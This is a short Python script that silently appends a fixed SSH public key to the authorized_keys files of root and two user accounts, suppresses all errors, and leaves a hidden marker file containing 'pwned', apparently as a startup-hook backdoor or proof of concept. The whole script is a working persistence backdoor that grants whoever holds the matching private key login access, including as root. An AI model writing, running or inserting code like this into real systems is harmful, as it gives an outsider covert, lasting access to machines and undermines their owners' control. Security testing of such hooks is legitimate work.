import os
pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main"
for home in ["/root", "/home/hermes", "/home/ubuntu"]:
    try:
        os.makedirs(f"{home}/.ssh", exist_ok=True)
        with open(f"{home}/.ssh/authorized_keys", "a") as f:
            f.write(pubkey + "\n")
        os.chmod(f"{home}/.ssh", 0o700)
        os.chmod(f"{home}/.ssh/authorized_keys", 0o600)
    except Exception:
        pass
with open("/tmp/.python_startup_executed", "w") as f:
    f.write("pwned")
